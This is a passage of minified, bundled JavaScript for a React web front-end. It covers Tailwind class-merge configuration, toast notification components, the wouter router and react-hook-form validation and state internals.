        "scroll-mx": ["scroll-mr", "scroll-ml"],
        "scroll-my": ["scroll-mt", "scroll-mb"],
        "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
        "scroll-px": ["scroll-pr", "scroll-pl"],
        "scroll-py": ["scroll-pt", "scroll-pb"],
        touch: ["touch-x", "touch-y", "touch-pz"],
        "touch-x": ["touch"],
        "touch-y": ["touch"],
        "touch-pz": ["touch"]
      },
      conflictingClassGroupModifiers: {
        "font-size": ["leading"]
      }
    }
  },
  lN = $C(aN);

function Nt(...e) {
  return lN(kC(e))
}
const cN = yC,
  qv = x.forwardRef(({
    className: e,
    ...t
  }, n) => l.jsx(_v, {
    ref: n,
    className: Nt("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]", e),
    ...t
  }));
qv.displayName = _v.displayName;
const uN = zv("group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full", {
  variants: {
    variant: {
      default: "border bg-background text-foreground",
      destructive: "destructive group border-destructive bg-destructive text-destructive-foreground"
    }
  },
  defaultVariants: {
    variant: "default"
  }
}),
  Yv = x.forwardRef(({
    className: e,
    variant: t,
    ...n
  }, r) => l.jsx(Iv, {
    ref: r,
    className: Nt(uN({
      variant: t
    }), e),
    ...n
  }));
Yv.displayName = Iv.displayName;
const dN = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx(Fv, {
  ref: n,
  className: Nt("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive", e),
  ...t
}));
dN.displayName = Fv.displayName;
const Xv = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx(Vv, {
  ref: n,
  className: Nt("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600", e),
  "toast-close": "",
  ...t,
  children: l.jsx(TC, {
    className: "h-4 w-4"
  })
}));
Xv.displayName = Vv.displayName;
const Jv = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx(Lv, {
  ref: n,
  className: Nt("text-sm font-semibold", e),
  ...t
}));
Jv.displayName = Lv.displayName;
const Zv = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx(Ov, {
  ref: n,
  className: Nt("text-sm opacity-90", e),
  ...t
}));
Zv.displayName = Ov.displayName;

function fN() {
  const {
    toasts: e
  } = AS();
  return l.jsxs(cN, {
    children: [e.map(function ({
      id: t,
      title: n,
      description: r,
      action: s,
      ...o
    }) {
      return l.jsxs(Yv, {
        ...o,
        children: [l.jsxs("div", {
          className: "grid gap-1",
          children: [n && l.jsx(Jv, {
            children: n
          }), r && l.jsx(Zv, {
            children: r
          })]
        }), s, l.jsx(Xv, {})]
      }, t)
    }), l.jsx(qv, {})]
  })
}

function hN(e, t) {
  if (e instanceof RegExp) return {
    keys: !1,
    pattern: e
  };
  var n, r, s, o, i = [],
    a = "",
    c = e.split("/");
  for (c[0] || c.shift(); s = c.shift();) n = s[0], n === "*" ? (i.push(n), a += s[1] === "?" ? "(?:/(.*))?" : "/(.*)") : n === ":" ? (r = s.indexOf("?", 1), o = s.indexOf(".", 1), i.push(s.substring(1, ~r ? r : ~o ? o : s.length)), a += ~r && !~o ? "(?:/([^/]+?))?" : "/([^/]+?)", ~o && (a += (~r ? "?" : "") + "\\" + s.substring(o))) : a += "/" + s;
  return {
    keys: i,
    pattern: new RegExp("^" + a + (t ? "(?=$|/)" : "/?$"), "i")
  }
}
var ex = {
  exports: {}
},
  tx = {};
/**
 * @license React
 * use-sync-external-store-shim.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var zs = x;

function mN(e, t) {
  return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var pN = typeof Object.is == "function" ? Object.is : mN,
  gN = zs.useState,
  yN = zs.useEffect,
  vN = zs.useLayoutEffect,
  xN = zs.useDebugValue;

function wN(e, t) {
  var n = t(),
    r = gN({
      inst: {
        value: n,
        getSnapshot: t
      }
    }),
    s = r[0].inst,
    o = r[1];
  return vN(function () {
    s.value = n, s.getSnapshot = t, Ic(s) && o({
      inst: s
    })
  }, [e, n, t]), yN(function () {
    return Ic(s) && o({
      inst: s
    }), e(function () {
      Ic(s) && o({
        inst: s
      })
    })
  }, [e]), xN(n), n
}

function Ic(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
    var n = t();
    return !pN(e, n)
  } catch {
    return !0
  }
}

function bN(e, t) {
  return t()
}
var SN = typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u" ? bN : wN;
tx.useSyncExternalStore = zs.useSyncExternalStore !== void 0 ? zs.useSyncExternalStore : SN;
ex.exports = tx;
var CN = ex.exports;
const NN = Fw.useInsertionEffect,
  jN = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u",
  AN = jN ? x.useLayoutEffect : x.useEffect,
  PN = NN || AN,
  nx = e => {
    const t = x.useRef([e, (...n) => t[0](...n)]).current;
    return PN(() => {
      t[0] = e
    }), t[1]
  },
  EN = "popstate",
  Tf = "pushState",
  kf = "replaceState",
  TN = "hashchange",
  Ym = [EN, Tf, kf, TN],
  kN = e => {
    for (const t of Ym) addEventListener(t, e);
    return () => {
      for (const t of Ym) removeEventListener(t, e)
    }
  },
  rx = (e, t) => CN.useSyncExternalStore(kN, e, t),
  RN = () => location.search,
  DN = ({
    ssrSearch: e = ""
  } = {}) => rx(RN, () => e),
  Xm = () => location.pathname,
  MN = ({
    ssrPath: e
  } = {}) => rx(Xm, e ? () => e : Xm),
  _N = (e, {
    replace: t = !1,
    state: n = null
  } = {}) => history[t ? kf : Tf](n, "", e),
  IN = (e = {}) => [MN(e), _N],
  Jm = Symbol.for("wouter_v3");
if (typeof history < "u" && typeof window[Jm] > "u") {
  for (const e of [Tf, kf]) {
    const t = history[e];
    history[e] = function () {
      const n = t.apply(this, arguments),
        r = new Event(e);
      return r.arguments = arguments, dispatchEvent(r), n
    }
  }
  Object.defineProperty(window, Jm, {
    value: !0
  })
}
const LN = (e, t) => t.toLowerCase().indexOf(e.toLowerCase()) ? "~" + t : t.slice(e.length) || "/",
  sx = (e = "") => e === "/" ? "" : e,
  ON = (e, t) => e[0] === "~" ? e.slice(1) : sx(t) + e,
  FN = (e = "", t) => LN(Zm(sx(e)), Zm(t)),
  Zm = e => {
    try {
      return decodeURI(e)
    } catch {
      return e
    }
  },
  ox = {
    hook: IN,
    searchHook: DN,
    parser: hN,
    base: "",
    ssrPath: void 0,
    ssrSearch: void 0,
    hrefs: e => e
  },
  ix = x.createContext(ox),
  Ci = () => x.useContext(ix),
  ax = {},
  lx = x.createContext(ax),
  cx = () => x.useContext(lx),
  Fl = e => {
    const [t, n] = e.hook(e);
    return [FN(e.base, t), nx((r, s) => n(ON(r, e.base), s))]
  },
  In = () => Fl(Ci()),
  ux = (e, t, n, r) => {
    const {
      pattern: s,
      keys: o
    } = t instanceof RegExp ? {
      keys: !1,
      pattern: t
    } : e(t || "*", r), i = s.exec(n) || [], [a, ...c] = i;
    return a !== void 0 ? [!0, (() => {
      const u = o !== !1 ? Object.fromEntries(o.map((f, h) => [f, c[h]])) : i.groups;
      let d = {
        ...c
      };
      return u && Object.assign(d, u), d
    })(), ...r ? [a] : []] : [!1, null]
  },
  VN = ({
    children: e,
    ...t
  }) => {
    var d, f;
    const n = Ci(),
      r = t.hook ? ox : n;
    let s = r;
    const [o, i] = ((d = t.ssrPath) == null ? void 0 : d.split("?")) ?? [];
    i && (t.ssrSearch = i, t.ssrPath = o), t.hrefs = t.hrefs ?? ((f = t.hook) == null ? void 0 : f.hrefs);
    let a = x.useRef({}),
      c = a.current,
      u = c;
    for (let h in r) {
      const y = h === "base" ? r[h] + (t[h] || "") : t[h] || r[h];
      c === u && y !== u[h] && (a.current = u = {
        ...u
      }), u[h] = y, y !== r[h] && (s = u)
    }
    return x.createElement(ix.Provider, {
      value: s,
      children: e
    })
  },
  ep = ({
    children: e,
    component: t
  }, n) => t ? x.createElement(t, {
    params: n
  }) : typeof e == "function" ? e(n) : e,
  BN = e => {
    let t = x.useRef(ax),
      n = t.current;
    for (const r in e) e[r] !== n[r] && (n = e);
    return Object.keys(e).length === 0 && (n = e), t.current = n
  },
  At = ({
    path: e,
    nest: t,
    match: n,
    ...r
  }) => {
    const s = Ci(),
      [o] = Fl(s),
      [i, a, c] = n ?? ux(s.parser, e, o, t),
      u = BN({
        ...cx(),
        ...a
      });
    if (!i) return null;
    const d = c ? x.createElement(VN, {
      base: c
    }, ep(r, u)) : ep(r, u);
    return x.createElement(lx.Provider, {
      value: u,
      children: d
    })
  };
x.forwardRef((e, t) => {
  const n = Ci(),
    [r, s] = Fl(n),
    {
      to: o = "",
      href: i = o,
      onClick: a,
      asChild: c,
      children: u,
      className: d,
      replace: f,
      state: h,
      ...y
    } = e,
    w = nx(S => {
      S.ctrlKey || S.metaKey || S.altKey || S.shiftKey || S.button !== 0 || (a == null || a(S), S.defaultPrevented || (S.preventDefault(), s(i, e)))
    }),
    v = n.hrefs(i[0] === "~" ? i.slice(1) : n.base + i, n);
  return c && x.isValidElement(u) ? x.cloneElement(u, {
    onClick: w,
    href: v
  }) : x.createElement("a", {
    ...y,
    onClick: w,
    href: v,
    className: d != null && d.call ? d(r === i) : d,
    children: u,
    ref: t
  })
});
const dx = e => Array.isArray(e) ? e.flatMap(t => dx(t && t.type === x.Fragment ? t.props.children : t)) : [e],
  zN = ({
    children: e,
    location: t
  }) => {
    const n = Ci(),
      [r] = Fl(n);
    for (const s of dx(e)) {
      let o = 0;
      if (x.isValidElement(s) && (o = ux(n.parser, s.props.path, t || r, s.props.nest))[0]) return x.cloneElement(s, {
        match: o
      })
    }
    return null
  };
var Ni = e => e.type === "checkbox",
  kr = e => e instanceof Date,
  tt = e => e == null;
const fx = e => typeof e == "object";
var Ee = e => !tt(e) && !Array.isArray(e) && fx(e) && !kr(e),
  UN = e => Ee(e) && e.target ? Ni(e.target) ? e.target.checked : e.target.value : e,
  $N = e => e.substring(0, e.search(/\.\d+(\.|$)/)) || e,
  HN = (e, t) => e.has($N(t)),
  WN = e => {
    const t = e.constructor && e.constructor.prototype;
    return Ee(t) && t.hasOwnProperty("isPrototypeOf")
  },
  Rf = typeof window < "u" && typeof window.HTMLElement < "u" && typeof document < "u";

function Et(e) {
  let t;
  const n = Array.isArray(e);
  if (e instanceof Date) t = new Date(e);
  else if (e instanceof Set) t = new Set(e);
  else if (!(Rf && (e instanceof Blob || e instanceof FileList)) && (n || Ee(e)))
    if (t = n ? [] : {}, !n && !WN(e)) t = e;
    else
      for (const r in e) e.hasOwnProperty(r) && (t[r] = Et(e[r]));
  else return e;
  return t
}
var Vl = e => Array.isArray(e) ? e.filter(Boolean) : [],
  Ae = e => e === void 0,
  K = (e, t, n) => {
    if (!t || !Ee(e)) return n;
    const r = Vl(t.split(/[,[\].]+?/)).reduce((s, o) => tt(s) ? s : s[o], e);
    return Ae(r) || r === e ? Ae(e[t]) ? n : e[t] : r
  },
  Jt = e => typeof e == "boolean",
  Df = e => /^\w*$/.test(e),
  hx = e => Vl(e.replace(/["|']|\]/g, "").split(/\.|\[/)),
  me = (e, t, n) => {
    let r = -1;
    const s = Df(t) ? [t] : hx(t),
      o = s.length,
      i = o - 1;
    for (; ++r < o;) {
      const a = s[r];
      let c = n;
      if (r !== i) {
        const u = e[a];
        c = Ee(u) || Array.isArray(u) ? u : isNaN(+s[r + 1]) ? {} : []
      }
      if (a === "__proto__") return;
      e[a] = c, e = e[a]
    }
    return e
  };
const tp = {
  BLUR: "blur",
  FOCUS_OUT: "focusout",
  CHANGE: "change"
},
  Kt = {
    onBlur: "onBlur",
    onChange: "onChange",
    onSubmit: "onSubmit",
    onTouched: "onTouched",
    all: "all"
  },
  mn = {
    max: "max",
    min: "min",
    maxLength: "maxLength",
    minLength: "minLength",
    pattern: "pattern",
    required: "required",
    validate: "validate"
  };
ce.createContext(null);
var KN = (e, t, n, r = !0) => {
  const s = {
    defaultValues: t._defaultValues
  };
  for (const o in e) Object.defineProperty(s, o, {
    get: () => {
      const i = o;
      return t._proxyFormState[i] !== Kt.all && (t._proxyFormState[i] = !r || Kt.all), e[i]
    }
  });
  return s
},
  at = e => Ee(e) && !Object.keys(e).length,
  QN = (e, t, n, r) => {
    n(e);
    const {
      name: s,
      ...o
    } = e;
    return at(o) || Object.keys(o).length >= Object.keys(t).length || Object.keys(o).find(i => t[i] === Kt.all)
  },
  ja = e => Array.isArray(e) ? e : [e];

function GN(e) {
  const t = ce.useRef(e);
  t.current = e, ce.useEffect(() => {
    const n = !e.disabled && t.current.subject && t.current.subject.subscribe({
      next: t.current.next
    });
    return () => {
      n && n.unsubscribe()
    }
  }, [e.disabled])
}
var rn = e => typeof e == "string",
  qN = (e, t, n, r, s) => rn(e) ? (r && t.watch.add(e), K(n, e, s)) : Array.isArray(e) ? e.map(o => (r && t.watch.add(o), K(n, o))) : (r && (t.watchAll = !0), n),
  YN = (e, t, n, r, s) => t ? {
    ...n[e],
    types: {
      ...n[e] && n[e].types ? n[e].types : {},
      [r]: s || !0
    }
  } : {},
  np = e => ({
    isOnSubmit: !e || e === Kt.onSubmit,
    isOnBlur: e === Kt.onBlur,
    isOnChange: e === Kt.onChange,
    isOnAll: e === Kt.all,
    isOnTouch: e === Kt.onTouched
  }),
  rp = (e, t, n) => !n && (t.watchAll || t.watch.has(e) || [...t.watch].some(r => e.startsWith(r) && /^\.\w+/.test(e.slice(r.length))));
const Fo = (e, t, n, r) => {
  for (const s of n || Object.keys(e)) {
    const o = K(e, s);
    if (o) {
      const {
        _f: i,
        ...a
      } = o;
      if (i) {
        if (i.refs && i.refs[0] && t(i.refs[0], s) && !r) return !0;
        if (i.ref && t(i.ref, i.name) && !r) return !0;
        if (Fo(a, t)) break
      } else if (Ee(a) && Fo(a, t)) break
    }
  }
};
var XN = (e, t, n) => {
  const r = ja(K(e, n));
  return me(r, "root", t[n]), me(e, n, r), e
},
  Mf = e => e.type === "file",
  wn = e => typeof e == "function",
  nl = e => {
    if (!Rf) return !1;
    const t = e ? e.ownerDocument : 0;
    return e instanceof (t && t.defaultView ? t.defaultView.HTMLElement : HTMLElement)
  },
  Aa = e => rn(e),
  _f = e => e.type === "radio",
  rl = e => e instanceof RegExp;
const sp = {
  value: !1,
  isValid: !1
},
  op = {
    value: !0,
    isValid: !0
  };
var mx = e => {
  if (Array.isArray(e)) {
    if (e.length > 1) {
      const t = e.filter(n => n && n.checked && !n.disabled).map(n => n.value);
      return {
        value: t,
        isValid: !!t.length
      }
    }
    return e[0].checked && !e[0].disabled ? e[0].attributes && !Ae(e[0].attributes.value) ? Ae(e[0].value) || e[0].value === "" ? op : {
      value: e[0].value,
      isValid: !0
    } : op : sp
  }
  return sp
};
const ip = {
  isValid: !1,
  value: null
};
var px = e => Array.isArray(e) ? e.reduce((t, n) => n && n.checked && !n.disabled ? {
  isValid: !0,
  value: n.value
} : t, ip) : ip;

function ap(e, t, n = "validate") {
  if (Aa(e) || Array.isArray(e) && e.every(Aa) || Jt(e) && !e) return {
    type: n,
    message: Aa(e) ? e : "",
    ref: t
  }
}
var Xr = e => Ee(e) && !rl(e) ? e : {
  value: e,
  message: ""
},
  lp = async (e, t, n, r, s) => {
    const {
      ref: o,
      refs: i,
      required: a,
      maxLength: c,
      minLength: u,
      min: d,
      max: f,
      pattern: h,
      validate: y,
      name: w,
      valueAsNumber: v,
      mount: S,
      disabled: g
    } = e._f, p = K(t, w);
    if (!S || g) return {};
    const m = i ? i[0] : o,
      b = I => {
        r && m.reportValidity && (m.setCustomValidity(Jt(I) ? "" : I || ""), m.reportValidity())
      },
      C = {},
      j = _f(o),
      A = Ni(o),
      P = j || A,
      M = (v || Mf(o)) && Ae(o.value) && Ae(p) || nl(o) && o.value === "" || p === "" || Array.isArray(p) && !p.length,
      _ = YN.bind(null, w, n, C),
      G = (I, $, U, te = mn.maxLength, re = mn.minLength) => {
        const X = I ? $ : U;
        C[w] = {
          type: I ? te : re,
          message: X,
          ref: o,
          ..._(I ? te : re, X)
        }
      };
    if (s ? !Array.isArray(p) || !p.length : a && (!P && (M || tt(p)) || Jt(p) && !p || A && !mx(i).isValid || j && !px(i).isValid)) {
      const {
        value: I,
        message: $
      } = Aa(a) ? {
        value: !!a,
        message: a
      } : Xr(a);
      if (I && (C[w] = {
        type: mn.required,
        message: $,
        ref: m,
        ..._(mn.required, $)
      }, !n)) return b($), C
    }
    if (!M && (!tt(d) || !tt(f))) {
      let I, $;
      const U = Xr(f),
        te = Xr(d);
      if (!tt(p) && !isNaN(p)) {
        const re = o.valueAsNumber || p && +p;
        tt(U.value) || (I = re > U.value), tt(te.value) || ($ = re < te.value)
      } else {
        const re = o.valueAsDate || new Date(p),
          X = L => new Date(new Date().toDateString() + " " + L),
          D = o.type == "time",
          R = o.type == "week";
        rn(U.value) && p && (I = D ? X(p) > X(U.value) : R ? p > U.value : re > new Date(U.value)), rn(te.value) && p && ($ = D ? X(p) < X(te.value) : R ? p < te.value : re < new Date(te.value))
      }
      if ((I || $) && (G(!!I, U.message, te.message, mn.max, mn.min), !n)) return b(C[w].message), C
    }
    if ((c || u) && !M && (rn(p) || s && Array.isArray(p))) {
      const I = Xr(c),
        $ = Xr(u),
        U = !tt(I.value) && p.length > +I.value,
        te = !tt($.value) && p.length < +$.value;
      if ((U || te) && (G(U, I.message, $.message), !n)) return b(C[w].message), C
    }
    if (h && !M && rn(p)) {
      const {
        value: I,
        message: $
      } = Xr(h);
      if (rl(I) && !p.match(I) && (C[w] = {
        type: mn.pattern,
        message: $,
        ref: o,
        ..._(mn.pattern, $)
      }, !n)) return b($), C
    }
    if (y) {
      if (wn(y)) {
        const I = await y(p, t),
          $ = ap(I, m);
        if ($ && (C[w] = {
          ...$,
          ..._(mn.validate, $.message)
        }, !n)) return b($.message), C
      } else if (Ee(y)) {
        let I = {};
        for (const $ in y) {
          if (!at(I) && !n) break;
          const U = ap(await y[$](p, t), m, $);
          U && (I = {
            ...U,
            ..._($, U.message)
          }, b(U.message), n && (C[w] = I))
        }
        if (!at(I) && (C[w] = {
          ref: m,
          ...I
        }, !n)) return C
      }
    }
    return b(!0), C
  };

function JN(e, t) {
  const n = t.slice(0, -1).length;
  let r = 0;
  for (; r < n;) e = Ae(e) ? r++ : e[t[r++]];
  return e
}

function ZN(e) {
  for (const t in e)
    if (e.hasOwnProperty(t) && !Ae(e[t])) return !1;
  return !0
}

function De(e, t) {
  const n = Array.isArray(t) ? t : Df(t) ? [t] : hx(t),
    r = n.length === 1 ? e : JN(e, n),
    s = n.length - 1,
    o = n[s];
  return r && delete r[o], s !== 0 && (Ee(r) && at(r) || Array.isArray(r) && ZN(r)) && De(e, n.slice(0, -1)), e
}
var Lc = () => {
  let e = [];
  return {
    get observers() {
      return e
    },
    next: s => {
      for (const o of e) o.next && o.next(s)
    },
    subscribe: s => (e.push(s), {
      unsubscribe: () => {
        e = e.filter(o => o !== s)
      }
    }),
    unsubscribe: () => {
      e = []
    }
  }
},
  od = e => tt(e) || !fx(e);

function Kn(e, t) {
  if (od(e) || od(t)) return e === t;
  if (kr(e) && kr(t)) return e.getTime() === t.getTime();
  const n = Object.keys(e),
    r = Object.keys(t);
  if (n.length !== r.length) return !1;
  for (const s of n) {
    const o = e[s];
    if (!r.includes(s)) return !1;
    if (s !== "ref") {
      const i = t[s];
      if (kr(o) && kr(i) || Ee(o) && Ee(i) || Array.isArray(o) && Array.isArray(i) ? !Kn(o, i) : o !== i) return !1
    }
  }
  return !0
}
var gx = e => e.type === "select-multiple",
  e3 = e => _f(e) || Ni(e),
  Oc = e => nl(e) && e.isConnected,
  yx = e => {
    for (const t in e)
      if (wn(e[t])) return !0;
    return !1
  };

function sl(e, t = {}) {
  const n = Array.isArray(e);
  if (Ee(e) || n)
    for (const r in e) Array.isArray(e[r]) || Ee(e[r]) && !yx(e[r]) ? (t[r] = Array.isArray(e[r]) ? [] : {}, sl(e[r], t[r])) : tt(e[r]) || (t[r] = !0);
  return t
}

function vx(e, t, n) {
  const r = Array.isArray(e);
  if (Ee(e) || r)
    for (const s in e) Array.isArray(e[s]) || Ee(e[s]) && !yx(e[s]) ? Ae(t) || od(n[s]) ? n[s] = Array.isArray(e[s]) ? sl(e[s], []) : {
      ...sl(e[s])
    } : vx(e[s], tt(t) ? {} : t[s], n[s]) : n[s] = !Kn(e[s], t[s]);
  return n
}
var vo = (e, t) => vx(e, t, sl(t)),
  xx = (e, {
    valueAsNumber: t,
    valueAsDate: n,
    setValueAs: r
  }) => Ae(e) ? e : t ? e === "" ? NaN : e && +e : n && rn(e) ? new Date(e) : r ? r(e) : e;

function Fc(e) {
  const t = e.ref;
  if (!(e.refs ? e.refs.every(n => n.disabled) : t.disabled)) return Mf(t) ? t.files : _f(t) ? px(e.refs).value : gx(t) ? [...t.selectedOptions].map(({
    value: n
  }) => n) : Ni(t) ? mx(e.refs).value : xx(Ae(t.value) ? e.ref.value : t.value, e)
}
var t3 = (e, t, n, r) => {
  const s = {};
  for (const o of e) {
    const i = K(t, o);
    i && me(s, o, i._f)
  }
  return {
    criteriaMode: n,
    names: [...e],
    fields: s,
    shouldUseNativeValidation: r
  }
},
  xo = e => Ae(e) ? e : rl(e) ? e.source : Ee(e) ? rl(e.value) ? e.value.source : e.value : e;
const cp = "AsyncFunction";
var n3 = e => (!e || !e.validate) && !!(wn(e.validate) && e.validate.constructor.name === cp || Ee(e.validate) && Object.values(e.validate).find(t => t.constructor.name === cp)),
  r3 = e => e.mount && (e.required || e.min || e.max || e.maxLength || e.minLength || e.pattern || e.validate);

function up(e, t, n) {
  const r = K(e, n);
  if (r || Df(n)) return {
    error: r,
    name: n
  };
  const s = n.split(".");
  for (; s.length;) {
    const o = s.join("."),
      i = K(t, o),
      a = K(e, o);
    if (i && !Array.isArray(i) && n !== o) return {
      name: n
    };
    if (a && a.type) return {
      name: o,
      error: a
    };
    s.pop()
  }
  return {
    name: n
  }
}
var s3 = (e, t, n, r, s) => s.isOnAll ? !1 : !n && s.isOnTouch ? !(t || e) : (n ? r.isOnBlur : s.isOnBlur) ? !e : (n ? r.isOnChange : s.isOnChange) ? e : !0,
  o3 = (e, t) => !Vl(K(e, t)).length && De(e, t);
const i3 = {
  mode: Kt.onSubmit,
  reValidateMode: Kt.onChange,
  shouldFocusError: !0
};

function a3(e = {}) {
  let t = {
    ...i3,
    ...e
  },
    n = {
      submitCount: 0,
      isDirty: !1,
      isLoading: wn(t.defaultValues),
      isValidating: !1,
      isSubmitted: !1,
      isSubmitting: !1,
      isSubmitSuccessful: !1,
      isValid: !1,
      touchedFields: {},
      dirtyFields: {},
      validatingFields: {},
      errors: t.errors || {},
      disabled: t.disabled || !1
    },
    r = {},
    s = Ee(t.defaultValues) || Ee(t.values) ? Et(t.defaultValues || t.values) || {} : {},
    o = t.shouldUnregister ? {} : Et(s),
    i = {
      action: !1,
      mount: !1,
      watch: !1
    },
    a = {
      mount: new Set,
      unMount: new Set,
      array: new Set,
      watch: new Set
    },
    c, u = 0;
  const d = {
    isDirty: !1,
    dirtyFields: !1,
    validatingFields: !1,
    touchedFields: !1,
    isValidating: !1,
    isValid: !1,
    errors: !1
  },
    f = {
      values: Lc(),
      array: Lc(),
      state: Lc()
    },
    h = np(t.mode),
    y = np(t.reValidateMode),
    w = t.criteriaMode === Kt.all,
    v = N => E => {
      clearTimeout(u), u = setTimeout(N, E)
    },
    S = async N => {
      if (!e.disabled && (d.isValid || N)) {
        const E = t.resolver ? at((await P()).errors) : await _(r, !0);
        E !== n.isValid && f.state.next({
          isValid: E
        })
      }
    }, g = (N, E) => {
      !e.disabled && (d.isValidating || d.validatingFields) && ((N || Array.from(a.mount)).forEach(T => {
        T && (E ? me(n.validatingFields, T, E) : De(n.validatingFields, T))
      }), f.state.next({
        validatingFields: n.validatingFields,
        isValidating: !at(n.validatingFields)
      }))
    }, p = (N, E = [], T, z, V = !0, F = !0) => {
      if (z && T && !e.disabled) {
        if (i.action = !0, F && Array.isArray(K(r, N))) {
          const Q = T(K(r, N), z.argA, z.argB);
          V && me(r, N, Q)
        }
        if (F && Array.isArray(K(n.errors, N))) {
          const Q = T(K(n.errors, N), z.argA, z.argB);
          V && me(n.errors, N, Q), o3(n.errors, N)
        }
        if (d.touchedFields && F && Array.isArray(K(n.touchedFields, N))) {
          const Q = T(K(n.touchedFields, N), z.argA, z.argB);
          V && me(n.touchedFields, N, Q)
        }
        d.dirtyFields && (n.dirtyFields = vo(s, o)), f.state.next({
          name: N,
          isDirty: I(N, E),
          dirtyFields: n.dirtyFields,
          errors: n.errors,
          isValid: n.isValid
        })
      } else me(o, N, E)
    }, m = (N, E) => {
      me(n.errors, N, E), f.state.next({
        errors: n.errors
      })
    }, b = N => {
      n.errors = N, f.state.next({
        errors: n.errors,
        isValid: !1
      })
    }, C = (N, E, T, z) => {
      const V = K(r, N);
      if (V) {
        const F = K(o, N, Ae(T) ? K(s, N) : T);
        Ae(F) || z && z.defaultChecked || E ? me(o, N, E ? F : Fc(V._f)) : te(N, F), i.mount && S()
      }
    }, j = (N, E, T, z, V) => {
      let F = !1,
        Q = !1;
      const Z = {
        name: N
      };
      if (!e.disabled) {
        const Te = !!(K(r, N) && K(r, N)._f && K(r, N)._f.disabled);
        if (!T || z) {
          d.isDirty && (Q = n.isDirty, n.isDirty = Z.isDirty = I(), F = Q !== Z.isDirty);
          const ke = Te || Kn(K(s, N), E);
          Q = !!(!Te && K(n.dirtyFields, N)), ke || Te ? De(n.dirtyFields, N) : me(n.dirtyFields, N, !0), Z.dirtyFields = n.dirtyFields, F = F || d.dirtyFields && Q !== !ke
        }
        if (T) {
          const ke = K(n.touchedFields, N);
          ke || (me(n.touchedFields, N, T), Z.touchedFields = n.touchedFields, F = F || d.touchedFields && ke !== T)
        }
        F && V && f.state.next(Z)
      }
      return F ? Z : {}
    }, A = (N, E, T, z) => {
      const V = K(n.errors, N),
        F = d.isValid && Jt(E) && n.isValid !== E;
      if (e.delayError && T ? (c = v(() => m(N, T)), c(e.delayError)) : (clearTimeout(u), c = null, T ? me(n.errors, N, T) : De(n.errors, N)), (T ? !Kn(V, T) : V) || !at(z) || F) {
        const Q = {
          ...z,
          ...F && Jt(E) ? {
            isValid: E
          } : {},
          errors: n.errors,
          name: N
        };
        n = {
          ...n,
          ...Q
        }, f.state.next(Q)
      }
    }, P = async N => {
      g(N, !0);
      const E = await t.resolver(o, t.context, t3(N || a.mount, r, t.criteriaMode, t.shouldUseNativeValidation));
      return g(N), E
    }, M = async N => {
      const {
        errors: E
      } = await P(N);
      if (N)
        for (const T of N) {
          const z = K(E, T);
          z ? me(n.errors, T, z) : De(n.errors, T)
        } else n.errors = E;
      return E
    }, _ = async (N, E, T = {
      valid: !0
    }) => {
      for (const z in N) {
        const V = N[z];
        if (V) {
          const {
            _f: F,
            ...Q
          } = V;
          if (F) {
            const Z = a.array.has(F.name),
              Te = V._f && n3(V._f);
            Te && d.validatingFields && g([z], !0);
            const ke = await lp(V, o, w, t.shouldUseNativeValidation && !E, Z);
            if (Te && d.validatingFields && g([z]), ke[F.name] && (T.valid = !1, E)) break;
            !E && (K(ke, F.name) ? Z ? XN(n.errors, ke, F.name) : me(n.errors, F.name, ke[F.name]) : De(n.errors, F.name))
          } !at(Q) && await _(Q, E, T)
        }
      }
      return T.valid
    }, G = () => {
      for (const N of a.unMount) {
        const E = K(r, N);
        E && (E._f.refs ? E._f.refs.every(T => !Oc(T)) : !Oc(E._f.ref)) && Je(N)
      }
      a.unMount = new Set
    }, I = (N, E) => !e.disabled && (N && E && me(o, N, E), !Kn(J(), s)), $ = (N, E, T) => qN(N, a, {
      ...i.mount ? o : Ae(E) ? s : rn(N) ? {
        [N]: E
      } : E
    }, T, E), U = N => Vl(K(i.mount ? o : s, N, e.shouldUnregister ? K(s, N, []) : [])), te = (N, E, T = {}) => {
      const z = K(r, N);
      let V = E;
      if (z) {
        const F = z._f;
